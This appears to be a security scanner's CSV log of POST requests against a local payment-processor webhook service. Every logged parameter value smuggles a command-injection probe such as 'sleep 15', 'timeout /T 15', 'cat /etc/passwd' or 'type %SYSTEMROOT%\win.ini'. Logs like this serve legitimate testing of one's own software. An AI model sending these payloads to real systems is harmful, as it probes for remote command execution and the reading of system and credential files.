ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
4878,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27%26sleep+15.0%26%27&statusReembolso=AguardandoRetornoProcessadora,200,OK,7,92,0
4879,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27%3Bsleep+15.0%3B%27&status=AguardandoRetornoProcessadora,200,OK,9,92,0
4880,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27%3Bsleep+15.0%3B%27&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4881,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=type+%25SYSTEMROOT%25%5Cwin.ini&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4882,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=type+%25SYSTEMROOT%25%5Cwin.ini&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4883,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%26type+%25SYSTEMROOT%25%5Cwin.ini&status=AguardandoRetornoProcessadora,200,OK,11,92,0
4884,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%26type+%25SYSTEMROOT%25%5Cwin.ini&statusReembolso=AguardandoRetornoProcessadora,200,OK,6,92,0
4885,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4886,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4887,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4888,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4889,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4890,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4891,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&status=AguardandoRetornoProcessadora,200,OK,12,92,0
4892,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&statusReembolso=AguardandoRetornoProcessadora,200,OK,11,92,0
4893,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4894,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&statusReembolso=AguardandoRetornoProcessadora,200,OK,7,92,0
4895,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%26timeout+%2FT+15.0&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4896,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%26timeout+%2FT+15.0&statusReembolso=AguardandoRetornoProcessadora,200,OK,7,92,0
4897,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%7Ctimeout+%2FT+15.0&status=AguardandoRetornoProcessadora,200,OK,10,92,0
4898,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%7Ctimeout+%2FT+15.0&statusReembolso=AguardandoRetornoProcessadora,200,OK,7,92,0
4899,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%22%26timeout+%2FT+15.0%26%22&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4900,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%22%26timeout+%2FT+15.0%26%22&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4901,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%22%7Ctimeout+%2FT+15.0&status=AguardandoRetornoProcessadora,200,OK,12,92,0
4902,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%22%7Ctimeout+%2FT+15.0&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4903,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27%26timeout+%2FT+15.0%26%27&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4904,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27%26timeout+%2FT+15.0%26%27&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4905,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27%7Ctimeout+%2FT+15.0&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4906,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27%7Ctimeout+%2FT+15.0&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4907,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=get-help&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4908,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=get-help&statusReembolso=AguardandoRetornoProcessadora,200,OK,10,92,0
4909,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%3Bget-help&status=AguardandoRetornoProcessadora,200,OK,12,92,0
4910,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%3Bget-help&statusReembolso=AguardandoRetornoProcessadora,200,OK,12,92,0
4911,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%22%3Bget-help&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4912,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%22%3Bget-help&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4913,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27%3Bget-help&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4914,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27%3Bget-help&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4915,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%3Bget-help+%23&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4916,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%3Bget-help+%23&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4917,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%3Bstart-sleep+-s+15.0&status=AguardandoRetornoProcessadora,200,OK,9,92,0
4918,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%3Bstart-sleep+-s+15.0&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4919,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%22%3Bstart-sleep+-s+15.0&status=AguardandoRetornoProcessadora,200,OK,10,92,0
4920,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%22%3Bstart-sleep+-s+15.0&statusReembolso=AguardandoRetornoProcessadora,200,OK,6,92,0
4921,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27%3Bstart-sleep+-s+15.0&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4922,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27%3Bstart-sleep+-s+15.0&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4923,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%3Bstart-sleep+-s+15.0+%23&status=AguardandoRetornoProcessadora,200,OK,9,92,0
4924,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%3Bstart-sleep+-s+15.0+%23&statusReembolso=AguardandoRetornoProcessadora,200,OK,7,92,0
4925,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=cat+%2Fetc%2Fpasswd,200,OK,7,92,0
4926,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=cat+%2Fetc%2Fpasswd,200,OK,9,92,0
4927,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%26cat+%2Fetc%2Fpasswd%26,200,OK,12,92,0
4928,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%26cat+%2Fetc%2Fpasswd%26,200,OK,12,92,0
4929,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,8,92,0
4930,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,8,92,0
4931,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,7,92,0
4932,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,10,92,0
4933,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,9,92,0
4934,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,8,92,0
4935,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,10,92,0
4936,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,12,92,0
4937,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,6,92,0
4938,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,10,92,0
4939,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%26sleep+15.0%26,200,OK,8,92,0
4940,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%26sleep+15.0%26,200,OK,5,92,0
4941,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%3Bsleep+15.0%3B,200,OK,9,92,0
4942,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%3Bsleep+15.0%3B,200,OK,9,92,0
4943,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22%26sleep+15.0%26%22,200,OK,9,92,0
4944,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22%26sleep+15.0%26%22,200,OK,9,92,0
4945,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22%3Bsleep+15.0%3B%22,200,OK,9,92,0
4946,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22%3Bsleep+15.0%3B%22,200,OK,6,92,0
4947,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27%26sleep+15.0%26%27,200,OK,6,92,0
4948,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27%26sleep+15.0%26%27,200,OK,8,92,0
4949,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27%3Bsleep+15.0%3B%27,200,OK,10,92,0
4950,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27%3Bsleep+15.0%3B%27,200,OK,9,92,0
4951,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,8,92,0
4952,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,9,92,0
4953,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,11,92,0
4954,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,9,92,0
4955,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,5,92,0
4956,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,8,92,0
4957,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,8,92,0
4958,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,5,92,0
4959,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,9,92,0
4960,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,7,92,0
4961,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,7,92,0
4962,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,7,92,0
4963,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,9,92,0
4964,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,10,92,0
4965,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%26timeout+%2FT+15.0,200,OK,6,92,0
4966,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%26timeout+%2FT+15.0,200,OK,9,92,0
4967,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%7Ctimeout+%2FT+15.0,200,OK,9,92,0
4968,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%7Ctimeout+%2FT+15.0,200,OK,7,92,0
4969,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22%26timeout+%2FT+15.0%26%22,200,OK,6,92,0
4970,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22%26timeout+%2FT+15.0%26%22,200,OK,10,92,0
4971,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22%7Ctimeout+%2FT+15.0,200,OK,8,92,0
4972,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22%7Ctimeout+%2FT+15.0,200,OK,10,92,0
4973,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27%26timeout+%2FT+15.0%26%27,200,OK,6,92,0
4974,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27%26timeout+%2FT+15.0%26%27,200,OK,10,92,0
4975,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27%7Ctimeout+%2FT+15.0,200,OK,10,92,0
4976,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27%7Ctimeout+%2FT+15.0,200,OK,12,92,0
4977,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=get-help,200,OK,7,92,0
4978,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=get-help,200,OK,7,92,0
